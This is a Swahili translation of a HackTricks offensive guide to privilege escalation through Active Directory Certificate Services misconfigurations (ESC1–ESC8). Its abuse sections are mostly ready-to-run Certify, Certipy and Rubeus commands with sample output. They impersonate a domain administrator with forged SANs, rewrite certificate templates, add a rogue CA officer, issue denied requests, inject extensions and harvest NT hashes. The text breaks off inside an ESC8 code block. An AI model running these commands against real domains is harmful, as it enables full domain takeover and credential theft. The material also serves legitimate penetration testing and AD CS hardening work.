# Kuongezeka kwa Ruhusa kwenye Domain ya AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za kuongezeka kwa ruhusa kutoka kwenye machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Certificate Templates Zisizosanidiwa Vizuri - ESC1

### Maelezo

### Maelezo ya Certificate Templates Zisizosanidiwa Vizuri - ESC1

- **Haki za Enrolment zimetolewa kwa users wenye privileges za chini na Enterprise CA.**
- **Idhini ya manager haihitajiki.**
- **Hakuna signatures kutoka kwa wafanyakazi walioidhinishwa zinazohitajika.**
- **Security descriptors kwenye certificate templates zina ruhusa nyingi kupita kiasi, hivyo kuwawezesha users wenye privileges za chini kupata haki za enrolment.**
- **Certificate templates zimesanidiwa kufafanua EKUs zinazowezesha authentication:**
- Vitambulisho vya Extended Key Usage (EKU), kama vile Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au kutokuwa na EKU (SubCA), vimejumuishwa.
- **Uwezo wa requesters kujumuisha subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
- Active Directory (AD) huipa subjectAltName (SAN) katika certificate kipaumbele kwa ajili ya identity verification ikiwa ipo. Hii inamaanisha kwamba kwa kubainisha SAN katika CSR, certificate inaweza kuombwa ili ku-impersonate user yeyote (kwa mfano, domain administrator). Ikiwa SAN inaweza kubainishwa na requester, hilo huonyeshwa kwenye AD object ya certificate template kupitia property ya `mspki-certificate-name-flag`. Property hii ni bitmask, na kuwepo kwa flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` kunaruhusu SAN kubainishwa na requester.

> [!CAUTION]
> Usanidi ulioelezwa unawaruhusu users wenye privileges za chini kuomba certificates zenye SAN yoyote wanayochagua, na hivyo kuwezesha authentication kama domain principal yeyote kupitia Kerberos au SChannel.

Feature hii wakati mwingine huwezeshwa ili kusaidia utengenezaji wa HTTPS au host certificates papo hapo na products au deployment services, au kutokana na kutokuelewa vizuri.

Imebainika kuwa kuunda certificate yenye option hii husababisha warning, jambo ambalo halitokei wakati certificate template iliyopo (kama vile template ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ikiwa imewezeshwa) inaduplicatiwa na kisha kubadilishwa ili kujumuisha authentication OID.<sup>[[6]](#references)</sup>

### Matumizi Mabaya

Ili **kupata certificate templates zilizo hatarini** unaweza kuendesha:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia vibaya vulnerability hii ili kujifanya administrator**, mtu anaweza kuendesha:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **certificate iliyozalishwa kuwa** format ya **`.pfx`** na kuitumia **ku-authenticate kwa kutumia Rubeus au certipy** tena:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binaries za Windows "Certreq.exe" na "Certutil.exe" zinaweza kutumika kuzalisha PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uhesabuji wa certificate templates ndani ya configuration schema ya AD Forest, hasa zile zisizohitaji approval au signatures, zenye EKU ya Client Authentication au Smart Card Logon, na zenye flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyowezeshwa, unaweza kufanywa kwa kuendesha LDAP query ifuatayo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Certificate Templates Zisizosanidiwa Vizuri - ESC2

### Maelezo

Hali ya pili ya abuse ni tofauti ya ya kwanza:

1. Haki za enrollment zinatolewa kwa low-privileged users na Enterprise CA.
2. Sharti la manager approval limezimwa.
3. Hitaji la authorized signatures limeondolewa.
4. Security descriptor yenye ruhusa nyingi kupita kiasi kwenye certificate template inawapa low-privileged users haki za certificate enrollment.
5. **Certificate template imefafanuliwa kujumuisha Any Purpose EKU au kutokuwa na EKU.**

**Any Purpose EKU** inaruhusu certificate kupatikana na attacker kwa **kusudi lolote**, likiwemo client authentication, server authentication, code signing, n.k. **Technique iliyotumika kwa ESC3** inaweza kutumiwa kutumia vibaya hali hii.

Certificates zisizo na **EKUs**, ambazo hufanya kazi kama subordinate CA certificates, zinaweza kutumiwa vibaya kwa **kusudi lolote** na **pia kutumika kusaini certificates mpya**. Kwa hiyo, attacker anaweza kubainisha EKUs au fields zozote katika certificates mpya kwa kutumia subordinate CA certificate.

Hata hivyo, certificates mpya zilizoundwa kwa ajili ya **domain authentication** hazitafanya kazi ikiwa subordinate CA haiaminiki na object ya **`NTAuthCertificates`**, ambayo ndiyo setting ya default. Hata hivyo, attacker bado anaweza kuunda **certificates mpya zenye EKU yoyote** na certificate values za kiholela. Hizi zinaweza **kutumiwa vibaya** kwa madhumuni mbalimbali (kwa mfano, code signing, server authentication, n.k.) na zinaweza kuwa na athari kubwa kwa applications nyingine kwenye network kama SAML, AD FS, au IPSec.<sup>[[6]](#references)</sup>

Ili ku-enumerate templates zinazolingana na hali hii ndani ya configuration schema ya AD Forest, LDAP query ifuatayo inaweza kutekelezwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Templates za Enrolment Agent Zilizosetiwa Vibaya - ESC3

### Maelezo

Hali hii ni kama ya kwanza na ya pili, lakini **inatumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (kwa hiyo ina seti 2 za masharti),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, inaruhusu principal **kujiandikisha** kwa **certificate** **kwa niaba ya mtumiaji mwingine**.

**“Enrollment agent”** hujiandikisha katika **template** kama hiyo na hutumia **certificate inayotokana nayo kusaini kwa pamoja CSR kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa kwa pamoja** kwa CA, na kujiandikisha katika **template** inayoruhusu **“enroll on behalf of”**, ambapo CA hujibu kwa **certificate inayomilikiwa na mtumiaji “mwingine”**.<sup>[[6]](#references)</sup>

**Mahitaji 1:**

- Haki za Enrollment zinatolewa kwa watumiaji wenye privileges ndogo na Enterprise CA.
- Sharti la idhini ya msimamizi limeondolewa.
- Hakuna sharti la saini zilizoidhinishwa.
- Security descriptor ya certificate template inaruhusu zaidi ya inavyopaswa, na kutoa haki za Enrollment kwa watumiaji wenye privileges ndogo.
- Certificate template inajumuisha Certificate Request Agent EKU, hivyo kuwezesha kuomba certificate templates nyingine kwa niaba ya principals wengine.

**Mahitaji 2:**

- Enterprise CA inatoa haki za Enrollment kwa watumiaji wenye privileges ndogo.
- Idhini ya msimamizi inazungukwa.
- Toleo la schema la template ni 1 au linazidi 2, na linabainisha Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
- EKU iliyobainishwa katika certificate template inaruhusu uthibitishaji wa domain.
- Vizuizi vya enrollment agents havitumiki kwenye CA.

### Matumizi mabaya

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya hali hii:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users** wanaoruhusiwa **kupata** **enrollment agent certificate**, templates ambazo **agents** wa enrollment wanaruhusiwa kutumia kwa enrollment, na **accounts** ambazo enrollment agent anaweza kuziwakilisha zinaweza kudhibitiwa na enterprise CAs. Hili hufanywa kwa kufungua `certsrc.msc` **snap-in**, **kubofya kulia CA**, **kubofya Properties**, kisha **kwenda** kwenye kichupo cha “Enrollment Agents”.

Hata hivyo, imebainika kuwa mpangilio wa **default** wa CAs ni “**Do not restrict enrollment agents**.” Wasimamizi wanapowezesha restriction kwa enrollment agents kwa kuchagua “Restrict enrollment agents,” configuration ya default bado inaruhusu sana. Inaruhusu **Everyone** kupata ruhusa ya kufanya enrollment katika templates zote kwa niaba ya mtu yeyote.

## Udhibiti Dhaifu wa Ufikiaji wa Certificate Template - ESC4

### **Maelezo**

**security descriptor** kwenye **certificate templates** hufafanua **permissions** ambazo **AD principals** mahususi wanazo kuhusu template hiyo.

Iwapo **attacker** ana **permissions** zinazohitajika za **kubadilisha** **template** na **kuweka** **misconfigurations zinazoweza kutumiwa**, privilege escalation inaweza kuwezeshwa.

Permissions muhimu zinazohusiana na certificate templates ni pamoja na:<sup>[[6]](#references)</sup>

- **Owner:** Hutoa udhibiti wa moja kwa moja juu ya object, na kuruhusu kubadilisha attributes yoyote.
- **FullControl:** Hutoa mamlaka kamili juu ya object, pamoja na uwezo wa kubadilisha attributes yoyote.
- **WriteOwner:** Huruhusu kubadilisha owner wa object kuwa principal anayemdhibiti attacker.
- **WriteDacl:** Huruhusu kurekebisha access controls, hali inayoweza kumpa attacker FullControl.
- **WriteProperty:** Hutoa ruhusa ya kuhariri properties zozote za object.

### Abuse

Ili kutambua principals walio na ruhusa za kuhariri templates na objects nyingine za PKI, fanya enumeration kwa kutumia Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Mfano wa privesc kama ule wa awali:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 hutokea wakati user ana write privileges kwenye certificate template. Hili linaweza, kwa mfano, kutumiwa vibaya kuandika upya configuration ya certificate template ili kufanya template iwe vulnerable kwa ESC1.

Kama tunavyoona kwenye path iliyo hapo juu, ni `JOHNPC` pekee aliye na privileges hizi, lakini user wetu `JOHN` ana edge mpya ya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa technique hii inahusiana na certificates, nimeimplement pia attack hii, ambayo inajulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Huu hapa ni muhtasari mfupi wa command ya `shadow auto` ya Certipy ya kupata NT hash ya victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza ku-overwrite usanidi wa certificate template kwa command moja. Kwa **chaguo-msingi**, Certipy ita-overwrite usanidi ili kuifanya iwe **vulnerable kwa ESC1**. Tunaweza pia kubainisha **`-save-old parameter` ili kuhifadhi usanidi wa zamani**, ambao utakuwa muhimu kwa **kurejesha** usanidi baada ya attack yetu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Udhibiti wa Ufikiaji wa Kitu cha PKI Kilicho Hatarini - ESC5

### Maelezo

Mtandao mpana wa mahusiano yanayohusiana kwa misingi ya ACL, unaojumuisha objects kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Objects hizi, ambazo zinaweza kuathiri kwa kiasi kikubwa usalama, zinajumuisha:

- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia mbinu kama S4U2Self au S4U2Proxy.
- RPC/DCOM server ya CA server.
- AD object au container yoyote iliyo chini ya container path maalum `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Path hii inajumuisha, lakini haiishii kwenye, containers na objects kama Certificate Templates container, Certification Authorities container, NTAuthCertificates object, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa attacker mwenye privileges ndogo ataweza kupata udhibiti wa mojawapo ya vipengele hivi muhimu.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama zilivyoelezwa na Microsoft. Configuration hii inapowashwa kwenye Certification Authority (CA), inaruhusu kuingizwa kwa **values zinazofafanuliwa na user** kwenye **subject alternative name** kwa **request yoyote**, ikiwemo zile zinazoundwa kutoka Active Directory®. Kwa hivyo, kipengele hiki kinamruhusu **intruder** kujisajili kupitia **template yoyote** iliyosanidiwa kwa ajili ya **domain authentication**—hasa zile zinazoruhusu usajili wa **unprivileged** users, kama User template ya kawaida. Kwa matokeo hayo, certificate inaweza kupatikana na kumwezesha intruder kujithibitisha kama domain administrator au **entity nyingine yoyote inayotumika** ndani ya domain.<sup>[[9]](#references)</sup>

**Kumbuka**: Mbinu ya kuongeza **alternative names** kwenye Certificate Signing Request (CSR), kupitia argument ya `-attrib "SAN:"` katika `certreq.exe` (inayorejelewa kama “Name Value Pairs”), ni **tofauti** na strategy ya exploitation ya SANs katika ESC1. Tofauti hapa iko katika **jinsi taarifa za account zinavyowekwa**—ndani ya certificate attribute, badala ya extension.

### Abuse

Ili kuthibitisha kama setting imewashwa, organizations zinaweza kutumia command ifuatayo pamoja na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii kimsingi hutumia **remote registry access**, hivyo, njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zina uwezo wa kugundua misconfiguration hii na kuitumia:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, tukidhani mtu ana **haki za kiutawala za domain** au zinazolingana nazo, amri ifuatayo inaweza kutekelezwa kutoka kwenye workstation yoyote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima usanidi huu katika mazingira yako, flag inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya security updates za Mei 2022, **certificates** mpya zitakuwa na **security extension** inayojumuisha sifa ya **`objectSid` ya requester**. Kwa ESC1, SID hii inatokana na SAN iliyobainishwa. Hata hivyo, kwa **ESC6**, SID inaakisi **`objectSid` ya requester**, si SAN.\
> Ili kutumia ESC6, ni muhimu mfumo uwe susceptible kwa ESC10 (Weak Certificate Mappings), ambayo huipa **SAN** kipaumbele kuliko **security extension** mpya.

## Udhibiti wa Certificate Authority - ESC7

### Shambulio la 1

#### Maelezo

Access control ya certificate authority hudumishwa kupitia seti ya permissions zinazosimamia vitendo vya CA. Permissions hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubofya CA kwa right-click, kuchagua properties, kisha kwenda kwenye Security tab. Pia, permissions zinaweza kuorodheshwa kwa kutumia module ya PSPKI pamoja na commands kama vile:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii hutoa maarifa kuhusu rights kuu, ambazo ni **`ManageCA`** na **`ManageCertificates`**, zinazoendana mtawalia na roles za “CA administrator” na “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Kuwa na rights za **`ManageCA`** kwenye certificate authority humwezesha principal kubadilisha settings kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha au kuzima flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu ubainishaji wa SAN kwenye template yoyote, jambo muhimu katika domain escalation.

Mchakato huu unaweza kurahisishwa kwa kutumia cmdlet ya **Enable-PolicyModuleFlag** ya PSPKI, inayoruhusu mabadiliko bila kuingiliana moja kwa moja na GUI.

Kuwa na rights za **`ManageCertificates`** huwezesha kuidhinisha requests zinazosubiri, na hivyo kukwepa ulinzi wa “CA certificate manager approval”.

Mchanganyiko wa modules za **Certify** na **PSPKI** unaweza kutumiwa kuomba, kuidhinisha, na kupakua certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Maelezo

> [!WARNING]
> Katika **shambulio la awali**, ruhusa za **`Manage CA`** zilitumika **kuwezesha** flag ya **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **shambulio la ESC6**, lakini hii haitakuwa na athari hadi service ya CA (`CertSvc`) iwashwe upya. Mtumiaji anapokuwa na access right ya **`Manage CA`**, pia anaruhusiwa **kuwasha service upya**. Hata hivyo, hii **haimaanishi kwamba mtumiaji anaweza kuwasha service upya kwa mbali**. Zaidi ya hayo, **ESC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyofanyiwa patch kutokana na security updates za Mei 2022.

Kwa hiyo, shambulio lingine linaonyeshwa hapa.

Masharti ya awali:

- Ruhusa ya **`ManageCA`** pekee
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kupitia **`ManageCA`**)
- Certificate template ya **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa kupitia **`ManageCA`**)

Technique hii inategemea ukweli kwamba watumiaji walio na access right za `Manage CA` _na_ `Manage Certificates` wanaweza **kuwasilisha maombi ya certificate yaliyoshindikana**. Certificate template ya **`SubCA`** iko **vulnerable kwa ESC1**, lakini **administrators pekee** wanaweza ku-enroll kwenye template hiyo. Kwa hiyo, **user** anaweza **kuomba** ku-enroll kwenye **`SubCA`** - ombi hilo **litakataliwa** - lakini **baadaye litatolewa na manager**.<sup>[[6]](#references)</sup>

#### Abuse

Unaweza **kujipa access right ya `Manage Certificates`** kwa kumuongeza user wako kama officer mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Kiolezo cha **`SubCA`** kinaweza **kuwezeshwa kwenye CA** kwa kutumia kigezo cha `-enable-template`. Kwa chaguo-msingi, kiolezo cha `SubCA` kimewezeshwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumetimiza masharti ya awali ya attack hii, tunaweza kuanza kwa **kuomba certificate kulingana na template ya `SubCA`**.

**Ombi hili litakataliwa**, lakini tutahifadhi private key na kuandika request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa kutumia **`Manage CA` na `Manage Certificates`**, tunaweza kisha **ku-issue certificate request iliyoshindikana** kwa amri ya `ca` na parameter ya `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kupata certificate iliyotolewa** kwa kutumia command ya `req` na parameter ya `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse ya Manage Certificates Extension (SetExtension)

#### Maelezo

Mbali na abuse za kawaida za ESC7 (kuwezesha attributes za EDITF au kuidhinisha requests zinazosubiri), **Certify 2.0** ilifichua primitive mpya kabisa inayohitaji tu role ya *Manage Certificates* (pia huitwa **Certificate Manager / Officer**) kwenye Enterprise CA.<sup>[[3]](#references)</sup>

Njia ya RPC ya `ICertAdmin::SetExtension` inaweza kutekelezwa na principal yeyote mwenye *Manage Certificates*. Ingawa kwa kawaida njia hii ilitumiwa na CAs halali kusasisha extensions kwenye requests **zinazosubiri**, attacker anaweza kuitumia vibaya ili **kuongeza *certificate extension isiyo ya default*** (kwa mfano OID maalum ya *Certificate Issuance Policy* kama `1.1.1.1`) kwenye request inayosubiri approval.

Kwa sababu template inayolengwa **haitambui default value** ya extension hiyo, CA **HAITAANDIKA juu** ya value inayodhibitiwa na attacker request itakapotolewa hatimaye. Kwa hiyo certificate inayotokana na mchakato huu huwa na extension iliyochaguliwa na attacker, ambayo inaweza:

* Kutimiza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo vulnerable (na kusababisha privilege escalation).
* Kuingiza EKUs au policies za ziada zinazopa certificate trust isiyotarajiwa katika third-party systems.

Kwa kifupi, *Manage Certificates* – ambayo hapo awali ilionekana kuwa nusu “isiyo na nguvu sana” ya ESC7 – sasa inaweza kutumiwa kwa privilege escalation kamili au persistence ya muda mrefu, bila kugusa CA configuration au kuhitaji right yenye masharti makali zaidi ya *Manage CA*.

#### Kutumia primitive hii vibaya kwa Certify 2.0

1. **Tuma certificate request ambayo itabaki *pending*.** Hili linaweza kulazimishwa kwa template inayohitaji manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ongeza extension maalum kwenye request inayosubiri** kwa kutumia command mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ikiwa template tayari haitambui extension ya *Certificate Issuance Policies*, value iliyo hapo juu itahifadhiwa baada ya issuance.*

3. **Toa request** (ikiwa role yako pia ina approval rights za *Manage Certificates*) au subiri operator ai-approve. Baada ya kutolewa, download certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Certificate inayotokana na mchakato huu sasa ina malicious issuance-policy OID na inaweza kutumika katika mashambulizi yanayofuata (k.m. ESC13, domain escalation, n.k.).

> NOTE:  Attack hiyo hiyo inaweza kutekelezwa kwa Certipy ≥ 4.7 kupitia command ya `ca` na parameter ya `-set-extension`.

## NTLM Relay kwa AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika environments ambako **AD CS imewekwa**, ikiwa kuna **web enrollment endpoint iliyo vulnerable** na angalau **certificate template moja imechapishwa** inayoruhusu **domain computer enrollment na client authentication** (kama template ya default **`Machine`**), inakuwa inawezekana kwa **computer yoyote yenye spooler service iliyo active kucompromise na attacker**!

**HTTP-based enrollment methods** kadhaa zinaungwa mkono na AD CS, na zinapatikana kupitia server roles za ziada ambazo administrators wanaweza kusakinisha. Interfaces hizi za HTTP-based certificate enrollment ziko vulnerable kwa **NTLM relay attacks**. Attacker, kutoka kwenye **machine iliyo compromised, anaweza ku-impersonate AD account yoyote inayofanya authentication kupitia inbound NTLM**. Anapo-impersonate victim account, attacker anaweza kufikia web interfaces hizi na **kuomba client authentication certificate kwa kutumia `User` au `Machine` certificate templates**.

- **Web enrollment interface** (ASP application ya zamani inayopatikana kwenye `http://<caserver>/certsrv/`) kwa default hutumia HTTP pekee, ambayo haitoi ulinzi dhidi ya NTLM relay attacks. Zaidi ya hayo, inaruhusu wazi authentication ya NTLM pekee kupitia Authorization HTTP header yake, hivyo authentication methods salama zaidi kama Kerberos haziwezi kutumika.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa default huunga mkono negotiate authentication kupitia Authorization HTTP header yao. Negotiate authentication **inaunga mkono Kerberos na NTLM**, hivyo kumruhusu attacker **kushusha authentication hadi NTLM** wakati wa relay attacks. Ingawa web services hizi huwezesha HTTPS kwa default, HTTPS pekee **hailindi dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa HTTPS services unawezekana tu HTTPS inapounganishwa na channel binding. Kwa bahati mbaya, AD CS haiwashi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.<sup>[[6]](#references)</sup>

**Tatizo** la kawaida katika NTLM relay attacks ni **muda mfupi wa NTLM sessions** na kutoweza kwa attacker kuingiliana na services ambazo **zinahitaji NTLM signing**.

Hata hivyo, kizuizi hiki kinaondolewa kwa kutumia NTLM relay attack kupata certificate ya user, kwa kuwa validity period ya certificate ndiyo huamua muda wa session, na certificate inaweza kutumiwa na services ambazo **zinahitaji NTLM signing**. Kwa maelekezo ya kutumia certificate iliyoibwa, rejelea:


{{#ref}}
account-persistence.md
{{#endref}}

Kizuizi kingine cha NTLM relay attacks ni kwamba **machine inayodhibitiwa na attacker lazima i-authenticate-iwe na victim account**. Attacker anaweza kusubiri au kujaribu **kulazimisha** authentication hiyo:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` hu-enumerate **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Sifa ya `msPKI-Enrollment-Servers` hutumiwa na enterprise Certificate Authorities (CAs) kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchanganuliwa na kuorodheshwa kwa kutumia tool **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Matumizi mabaya kwa kutumia Certify
```bash
## In the victim machine
